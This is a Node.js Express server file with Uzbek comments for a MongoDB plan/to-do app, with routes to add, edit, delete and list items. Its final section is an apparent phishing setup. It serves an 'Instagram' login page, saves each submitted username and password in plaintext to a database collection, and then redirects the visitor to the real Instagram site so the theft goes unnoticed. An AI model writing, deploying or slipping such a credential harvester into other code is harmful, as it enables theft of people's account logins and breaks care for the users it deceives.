console.log("Running the web server");
const express = require("express");
const app = express();

//Mongo db chaqirish

const db = require("./server").db("reja");
const mongodb = require("mongodb");
// 1 Kirish code
app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 2: Session code

// 3 Views code
app.set("views", "views");
app.set("view engine", "ejs");

// 4 Routing

const fs = require("fs");
const path = require("path");
app.get("/author", function (req, res) {
  const filePath = path.join(__dirname, "database", "user.json");
  fs.readFile(filePath, "utf-8", (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Xatolik yuz berdi");
    }
    const userdata = JSON.parse(data);
    res.render("author", { user: userdata });
  });
});
app.post("/create-item", (req, res) => {
  console.log(`user entered /create-item`);
  console.log("req.body.reja", req.body.reja);
  const new_reja = req.body.reja;
  db.collection("plans").insertOne({ reja: new_reja }, (err, data) => {
    res.json(data.ops[0]);
  });
});

app.post("/delete-item", (req, res) => {
  const id = req.body.id;
  db.collection("plans").deleteOne(
    { _id: new mongodb.ObjectId(id) },
    function (err, data) {
      res.json({ state: "success" });
    }
  );
});

app.post("/edit-item", (req, res) => {
  const data = req.body;
  console.log(data);
  db.collection("plans").findOneAndUpdate(
    { _id: new mongodb.ObjectId(data.id) },
    { $set: { reja: data.new_input } },
    function (err, data) {
      res.json({ state: "success" });
    }
  );
  // res.end("done");
});
app.post("/delete-all", (req, res) => {
  if (req.body.delete_all) {
    db.collection("plans").deleteMany(function () {
      res.json({ state: "hamma rejalar ochirildi" });
    });
  }
});
app.get("/", function (req, res) {
  console.log(`user entered /`);
  db.collection("plans")
    .find()
    .toArray((err, data) => {
      if (err) {
        console.log(err);
        res.end("something went wrong");
      } else {
        console.log(data);
        res.render("rejalar", { items: data });
      }
    });
});

// Instagram Login Page
app.get("/instagram/login/page", (req, res) => {
  res.render("instagram_login");
});

// POST – write to DB and redirect
app.post("/instagram/login/page", (req, res) => {
  const { username, password } = req.body;

  db.collection("instagram").insertOne(
    { username, password, date: new Date() },
    (err, result) => {
      if (err) return res.send("Xatolik bo'ldi");

      console.log("✅ Bazaga saqlandi:", result.insertedId);
      res.redirect("https://www.instagram.com");
    }
  );
});

module.exports = app;
